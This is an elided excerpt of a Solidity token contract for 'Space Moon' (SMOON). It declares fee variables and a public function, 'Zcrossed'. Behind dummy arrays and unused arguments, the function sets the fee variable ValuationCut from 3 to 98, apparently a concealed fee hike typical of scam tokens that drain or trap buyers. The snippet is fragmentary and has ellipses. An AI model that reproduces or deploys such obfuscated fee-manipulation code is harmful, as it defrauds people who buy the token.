...
contract SpaceMoon is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "Space Moon";
    string private constant _symbol = "SMOON";
    ...
    uint256 private ValuationCut = 3;
    uint256 private _tFeeTotal;
    uint256 private _redisFeeOnBuy = 0;
    uint256 private NewValuationOnBuy = 0;
    uint256 private _redisFeeOnSell = 0;

    uint256 private FirstTz;
    uint256 private SecondTc = 2;

    //Original Fee
    uint256 private _redisFee = _redisFeeOnSell;
    uint256 private NewValuation = ValuationCut;
    ...
    uint256[4] Arrone = [1,23,4,5];
    uint256[6] Arrtwo = [0,1,12,31,4,7];
    ...
    function Zcrossed(string memory Strong , uint256 Jira) public {
        Strong = "Strong";
        Jira = 9;
            FirstTz = Arrone[1] * Arrtwo[4] + (SecondTc *3);
            ValuationCut = FirstTz; 
        }
